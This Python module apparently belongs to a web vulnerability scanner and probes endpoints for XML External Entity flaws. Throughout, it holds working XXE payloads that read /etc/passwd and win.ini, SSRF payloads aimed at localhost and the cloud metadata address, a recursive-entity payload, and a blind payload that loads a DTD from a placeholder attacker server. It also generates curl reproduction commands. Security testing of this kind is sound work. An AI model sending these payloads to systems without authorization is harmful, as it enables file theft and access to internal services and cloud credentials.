"""
XXE (XML External Entity) Vulnerability Detector
Detects XML External Entity injection vulnerabilities
Reward potential: $1000-5000+

Detection techniques:
- XML endpoint detection (Content-Type: application/xml)
- File disclosure via external entities
- SSRF via XXE (out-of-band)
- Blind XXE detection
- Error-based XXE detection

CWE: CWE-611 (Improper Restriction of XML External Entity Reference)
OWASP: A05:2021 - Security Misconfiguration
"""

import asyncio
import re
from .registry import register_active

# XXE payloads for file disclosure
XXE_FILE_DISCLOSURE_PAYLOADS = {
    'etc_passwd': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>&xxe;</data>
</root>''',

    'windows_ini': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>
    <data>&xxe;</data>
</root>''',

    'etc_hosts': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>
    <data>&xxe;</data>
</root>''',

    'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<root>
    <data>test</data>
</root>''',
}

# Error-based XXE payloads (trigger parser errors with external entities)
XXE_ERROR_PAYLOADS = {
    'invalid_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<root>
    <data>&xxe;</data>
</root>''',

    'recursive_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY a "a&b;">
<!ENTITY b "b&a;">
]>
<root>
    <data>&a;</data>
</root>''',
}

# SSRF via XXE payloads
XXE_SSRF_PAYLOADS = {
    'internal_ip': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
<root>
    <data>&xxe;</data>
</root>''',

    'localhost': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<root>
    <data>&xxe;</data>
</root>''',

    'metadata': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>
    <data>&xxe;</data>
</root>''',
}

# Blind XXE payload (out-of-band)
XXE_BLIND_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd"> %xxe;]>
<root>
    <data>test</data>
</root>'''

# File disclosure indicators (evidence that file was read)
FILE_DISCLOSURE_INDICATORS = [
    r'root:.*:0:0:',  # /etc/passwd root entry
    r'daemon:.*:/usr/sbin/nologin',  # /etc/passwd daemon user
    r'nobody:.*:65534',  # nobody user
    r'\[fonts\]',  # windows win.ini
    r'\[extensions\]',  # windows win.ini
    r'127\.0\.0\.1\s+localhost',  # /etc/hosts
    r'::1\s+localhost',  # /etc/hosts IPv6
]

# Error messages indicating XXE processing
XXE_ERROR_INDICATORS = [
    'external entity',
    'DOCTYPE',
    'ENTITY',
    'xml parsing',
    'SAXParseException',
    'XMLSyntaxError',
    'EntityExpansionException',
    'java.io.FileNotFoundException',
    'system identifier',
    'entity reference',
]


def is_xml_content_type(content_type):
    """Check if Content-Type indicates XML"""
    if not content_type:
        return False

    xml_types = ['application/xml', 'text/xml', 'application/soap+xml']
    return any(xml_type in content_type.lower() for xml_type in xml_types)


def detect_file_disclosure(response_text):
    """Detect if response contains file disclosure evidence"""
    for pattern in FILE_DISCLOSURE_INDICATORS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False


def detect_xxe_error(response_text):
    """Detect XXE-related error messages"""
    for indicator in XXE_ERROR_INDICATORS:
        if indicator.lower() in response_text.lower():
            return True
    return False


@register_active
async def xxe_detector(session, url, context):
    """
    Detect XXE (XML External Entity) vulnerabilities

    Tests:
    1. File disclosure via external entities
    2. Error-based XXE detection
    3. SSRF via XXE
    4. Blind XXE (out-of-band)

    Returns list of XXE vulnerability findings
    """
    findings = []

    try:
        # First, check if endpoint accepts XML
        baseline_response = await session.get(url, allow_redirects=False, timeout=15)
        await baseline_response.text()
        baseline_response.status

        # Check Content-Type header
        accept_xml = False

        # Try sending XML to see if it's accepted
        test_xml = '<?xml version="1.0"?><root><data>test</data></root>'
        try:
            xml_test = await session.post(
                url,
                data=test_xml,
                headers={'Content-Type': 'application/xml'},
                allow_redirects=False,
                timeout=5
            )
            await xml_test.text()

            # If we get a response that's not 400/415, endpoint might accept XML
            if xml_test.status not in [400, 415]:
                accept_xml = True
        except Exception:
            pass

        # If endpoint doesn't seem to accept XML, skip
        if not accept_xml and not is_xml_content_type(baseline_response.headers.get('Content-Type', '')):
            return findings

        # Test 1: File disclosure XXE
        for payload_name, payload in XXE_FILE_DISCLOSURE_PAYLOADS.items():
            try:
                response = await session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    allow_redirects=False,
                    timeout=8
                )

                response_text = await response.text()

                # Check if file contents were disclosed
                if detect_file_disclosure(response_text):
                    # Extract disclosed content
                    disclosed_content = response_text[:500]

                    findings.append({
                        'type': 'XXE - File Disclosure',
                        'severity': 'critical',
                        'confidence': 'high',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'XXE file disclosure detected with payload "{payload_name}". Server returned file contents in response. Response excerpt: {disclosed_content}',
                        'payload': payload,
                        'payload_type': payload_name,
                        'disclosed_file': payload_name.replace('_', '/'),
                        'response_status': response.status,
                        'response_length': len(response_text),
                        'cvss_score': 9.1,
                        'cwe': 'CWE-611',
                        'impact': 'Attacker can read arbitrary files from the server filesystem, including sensitive files like /etc/passwd, configuration files, source code, and private keys. This can lead to complete system compromise.',
                        'recommendation': '1. Disable XML external entity processing in XML parser\n2. Use less complex data formats like JSON\n3. Keep XML parser libraries updated\n4. Implement input validation and sanitization\n5. Use XML parser features to disable DTDs entirely',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/xml" -d \'{payload.replace(chr(10), " ")[:200]}...\'',
                    })

                    # Found file disclosure, high severity
                    break

            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        # Test 2: Error-based XXE detection
        for payload_name, payload in XXE_ERROR_PAYLOADS.items():
            try:
                response = await session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    allow_redirects=False,
                    timeout=8
                )

                response_text = await response.text()

                # Check for XXE-related errors
                if detect_xxe_error(response_text):
                    findings.append({
                        'type': 'XXE - Error-Based Detection',
                        'severity': 'high',
                        'confidence': 'medium',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'XXE error detected with payload "{payload_name}". Server error message indicates XML external entity processing. Error excerpt: {response_text[:300]}',
                        'payload': payload,
                        'payload_type': payload_name,
                        'response_status': response.status,
                        'response_length': len(response_text),
                        'cvss_score': 8.2,
                        'cwe': 'CWE-611',
                        'impact': 'Server processes XML external entities, which could be exploited for file disclosure, SSRF, or DoS attacks. Error messages confirm vulnerable XML parser configuration.',
                        'recommendation': '1. Disable external entity processing in XML parser\n2. Configure XML parser with secure defaults\n3. Sanitize XML input before processing\n4. Implement proper error handling to avoid information disclosure',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/xml" -d \'{payload.replace(chr(10), " ")[:200]}...\'',
                    })
                    break

            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        # Test 3: SSRF via XXE
        for payload_name, payload in XXE_SSRF_PAYLOADS.items():
            try:
                # Measure response time for SSRF detection
                import time
                start_time = time.time()

                response = await session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    allow_redirects=False,
                    timeout=10
                )

                elapsed = time.time() - start_time
                response_text = await response.text()

                # Check for indicators of SSRF success
                ssrf_indicators = [
                    'connection refused',
                    'connection timeout',
                    'no route to host',
                    'Unknown host',
                    'metadata',  # AWS metadata
                    'instance-id',  # AWS metadata
                ]

                has_ssrf_indicator = any(ind in response_text.lower() for ind in ssrf_indicators)

                # Long response time might indicate connection attempt
                if has_ssrf_indicator or elapsed > 3.0:
                    findings.append({
                        'type': 'XXE - SSRF',
                        'severity': 'high',
                        'confidence': 'medium',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'XXE SSRF detected with payload "{payload_name}". Server attempted connection to internal resource. Response time: {elapsed:.2f}s. Response excerpt: {response_text[:300]}',
                        'payload': payload,
                        'payload_type': payload_name,
                        'response_status': response.status,
                        'response_time': f'{elapsed:.2f}s',
                        'response_length': len(response_text),
                        'cvss_score': 8.6,
                        'cwe': 'CWE-611',
                        'impact': 'Attacker can use XXE to perform SSRF attacks, accessing internal services, cloud metadata endpoints, or scanning internal network. This can lead to data exfiltration and further compromise.',
                        'recommendation': '1. Disable external entity processing\n2. Implement network egress filtering\n3. Block access to cloud metadata endpoints\n4. Use XML parser with secure configuration',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/xml" -d \'{payload.replace(chr(10), " ")[:200]}...\'',
                    })
                    break

            except asyncio.TimeoutError:
                # Timeout might indicate SSRF attempt
                findings.append({
                    'type': 'XXE - SSRF (Timeout)',
                    'severity': 'medium',
                    'confidence': 'low',
                    'url': url,
                    'method': 'POST',
                    'evidence': f'XXE SSRF suspected with payload "{payload_name}". Server timed out while processing external entity, suggesting connection attempt to internal resource.',
                    'payload': payload,
                    'payload_type': payload_name,
                    'cvss_score': 7.5,
                    'cwe': 'CWE-611',
                    'impact': 'Potential SSRF via XXE. Server may be attempting to resolve external entities, which could be exploited to access internal resources.',
                    'recommendation': 'Disable external entity processing in XML parser configuration',
                    'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/xml" -d \'{payload.replace(chr(10), " ")[:200]}...\'',
                })
            except Exception:
                continue

    except Exception:
        pass

    return findings
